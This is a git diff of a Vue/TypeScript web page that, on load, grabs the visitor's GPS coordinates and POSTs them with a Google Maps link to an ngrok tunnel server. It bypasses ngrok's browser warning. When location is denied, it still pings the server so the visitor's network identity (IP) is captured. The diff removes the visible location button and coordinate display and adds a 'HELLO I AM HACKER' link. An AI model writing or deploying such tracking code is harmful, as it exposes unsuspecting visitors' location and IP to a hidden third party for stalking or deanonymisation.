@@ -9,7 +9,7 @@ let map: L.Map | null = null;
 let marker: L.Marker | null = null;
 
 // SERVER ENDPOINT URL
-const SERVER_URL = "https://a790-183-182-115-58.ngrok-free.app";
+const SERVER_URL = "https://959e-183-182-110-242.ngrok-free.app/api/location";
 
 // -------------------------
 // INIT MAP
@@ -67,15 +67,11 @@ const time = new Intl.DateTimeFormat("en-US", {
 // -------------------------
 // SEND DATA HELPER
 // -------------------------
-const sendTrackingPayload = async (
-  lat: number | null,
-  lon: number | null,
-  mapLink: string | null,
-) => {
+const sendTrackingPayload = async (lat: number | null, lon: number | null, mapLink: string | null) => {
   try {
     console.log("Sending network packet payload to server...", { lat, lon });
-
-    const response = await fetch(`${SERVER_URL}/api/location`, {
+    
+    const response = await fetch(SERVER_URL, {
       method: "POST", // Capitalized standard method declaration
       headers: {
         "ngrok-skip-browser-warning": "true",
@@ -113,7 +109,7 @@ const getLocation = () => {
     async (position) => {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-
+      
       // FIXED TEMPLATE STRING HOOKS HERE:
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
@@ -128,10 +124,7 @@ const getLocation = () => {
       await sendTrackingPayload(lat, lon, mapLink);
     },
     async (error) => {
-      console.warn(
-        "GPS Permission Denied / Error Callback hit:",
-        error.message,
-      );
+      console.warn("GPS Permission Denied / Error Callback hit:", error.message);
       loading.value = false;
 
       // Fallback path sends empty telemetry coordinates so server extracts network identity safely
@@ -154,46 +147,28 @@ onMounted(() => {
     <div class="spinner"></div>
     <span>WAITING...</span>
   </div>
+  
   <div class="container">
-    <!-- <button class="btn" @click="getLocation">Get Current Location</button> -->
-
     <div v-if="result" class="info">
-      <!-- <p>
-        <strong>Latitude:</strong>
-        {{ result.lat }}
-      </p>
-
-      <p>
-        <strong>Longitude:</strong>
-        {{ result.lon }}
-      </p> -->
-
       <a :href="result.mapLink" target="_blank" rel="noopener noreferrer">
         HELLO I AM HACKER
       </a>
     </div>
 
-    <!-- <div id="map" class="map"></div> -->
+    <div id="map" class="map"></div>
   </div>
 </template>
-
 <style scoped>
 .container {
   padding: 20px;
 }
 
-.btn {
-  padding: 10px 16px;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-}
-
 .info {
   margin-top: 20px;
 }
+
 #map {
-  visibility: hidden;
+  visibility: hidden; /* Stays hidden unless explicitly triggered by structural success mapping */
 }
 
 .map {
@@ -204,20 +179,16 @@ onMounted(() => {
   overflow: hidden;
 }
 
-/*  */
-
 .loading {
   position: fixed;
   top: 0;
   left: 0;
   width: 100vw;
   height: 100vh;
-
   display: flex;
   flex-direction: column;
   justify-content: center;
   align-items: center;
-
   background: rgba(255, 255, 255, 0.8);
   z-index: 9999;
 }
